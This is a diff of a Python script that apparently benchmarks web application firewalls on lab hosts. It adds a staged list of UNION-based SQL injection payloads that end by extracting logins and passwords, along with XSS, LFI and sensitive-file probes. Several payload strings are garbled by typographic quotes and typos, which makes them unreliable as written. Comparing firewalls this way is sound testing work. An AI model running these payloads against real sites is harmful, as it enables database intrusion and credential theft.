@@ -7,7 +7,7 @@ import requests
 # Target instances
 TARGETS = {
     "No_WAF": "http://snf-6360.vlab.ac.ke",
-    "OpenAppSec": "https://snf-3406.vlab.ac.ke",
+    "CrowdSec": "http://snf-3406.vlab.ac.ke",
     "ModSecurity": "http://snf-3351.vlab.ac.ke"
 }
 
@@ -18,12 +18,6 @@ ATTACKS = [
         "endpoint": "/test.php",
         "method": "GET",
         "params": {"q": "<script>alert('XSS')</script>"},
-    },
-    {
-        "type": "SQL Injection",
-        "endpoint": "/admin/index.php",
-        "method": "POST",
-        "data": {"username": "' OR '1'='1' -- ", "password": "password"},
     },
     {
         "type": "LFI",
@@ -51,18 +45,103 @@ ATTACKS = [
     },
     {
         "type": "SQL Injection",
-        "endpoint": "/sqli_1.php?",
+        "endpoint": "/sqli_1.php",
         "method": "GET",
         "params": {"title": "blah%27+or+1=1--%20", "action": "search"}
-    }
+    },
+    {
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’order by 1- - -", "action": "search"}
+    },
+    {
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’order by 8- - - (out of clausle)", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4,5,6,7, - - -", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4, database (), 6,7, - - -", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4, version (), 6,7, - - -", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4, table_name, 6,7 from information_schema.tables- - -", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4, table_name, 6,7 from information_schema.tables where table_schema = database () - - -", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4, group_concat (table_name), 6,7 from information_schema.tables where table_schema = database () - - -", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4, group_concat (colume_name), 6,7 from information_schema.tables where table_schema =’ users’- - -", "action": "search"}
+    },
+    {    
+        "type": "SQL Injection",
+        "endpoint": "/sqli_1.php",
+        "method": "GET",
+        "params": {"title": "1 ’union select 1,2,3,4, group_concat (login, password), 6,7, from users- - -", "action": "search"}
+    },
+    # Sensitive File Access
     
-    #     {"type": "Sensitive File Access", "endpoint": "/phpinfo.php", "method": "GET", "check_status": 200},
-    #     {"type": "Sensitive File Access", "endpoint": "/config.inc", "method": "GET", "check_status": 200},
-    #     {"type": "Sensitive Directory Listing", "endpoint": "/passwords/", "method": "GET", "check_status": 200},
-    #     {"type": "Sensitive Directory Listing", "endpoint": "/db/", "method": "GET", "check_status": 200},
-    #     {"type": "Sensitive Directory Listing", "endpoint": "/documents/", "method": "GET", "check_status": 200},
-    #     # Cookie Security Check
-    #     {"type": "Cookie Security Check", "endpoint": "/", "method": "GET", "check_headers": ["Set-Cookie"]}
+    {
+        "type": "Sensitive File Access", 
+        "endpoint": "/phpinfo.php", 
+        "method": "GET"
+    },
+    {
+        "type": "Sensitive File Access", 
+        "endpoint": "/config.inc", 
+        "method": "GET"
+    },
+    {
+        "type": "Sensitive Directory Listing", 
+        "endpoint": "/passwords/", 
+        "method": "GET"
+    },
+    {
+        "type": "Sensitive Directory Listing", 
+        "endpoint": "/db/", 
+        "method": "GET"
+    },
+    {
+        "type": "Sensitive Directory Listing", 
+        "endpoint": "/documents/", 
+        "method": "GET"
+    },
+    # Cookie Security Check
+    {
+        "type": "Cookie Security Check", 
+        "endpoint": "/", 
+        "method": "GET", 
+    }
 ]
 
 # Data collection function
@@ -73,26 +152,41 @@ def attack_target(target_name, base_url):
         url = base_url + attack["endpoint"]
         method = attack["method"]
 
-        print(f"\n🔍 Testing [{attack['type']}] on {target_name} ({attack['endpoint']})...")
+        # print(f"\n🔍 Testing [{attack['type']}] on {target_name} ({attack['endpoint']})...")
+        print(f"\n🔍 Testing [{attack['type']}] on {target_name} ({url})...")
 
         try:
+            start_time = time.perf_counter()
+
             if method == "GET":
-                response = requests.get(url, params=attack.get("params"), timeout=5)
+                if "params" not in attack :
+                    response = requests.get(url, timeout=5)
+                else:
+                    response = requests.get(url, params=attack.get("params"), timeout=5)
             elif method == "POST":
                 response = requests.post(url, data=attack.get("data"), timeout=5)
             else:
                 continue
 
-            # Collect response details
+            end_time = time.perf_counter()
+            elapsed_time = end_time - start_time  # in seconds
+
+            request_data = None
+            if attack["method"] == "GET":
+                request_data = attack.get("params")
+            else:
+                request_data = attack.get("data")
+
             result = {
                 "target": target_name,
                 "attack_type": attack["type"],
                 "endpoint": attack["endpoint"],
-                "params": attack["params"],
+                "request": request_data,
                 "status_code": response.status_code,
-                "response_length": len(response.text),
-                "response_snippet": response.text[:200]  # Capture first 200 chars
+                "response_time_seconds": round(elapsed_time, 4),
+                # "response_snippet": response.text[:200]  # Capture first 200 chars
             }
+
             results.append(result)
 
             # Log potential blocking behavior
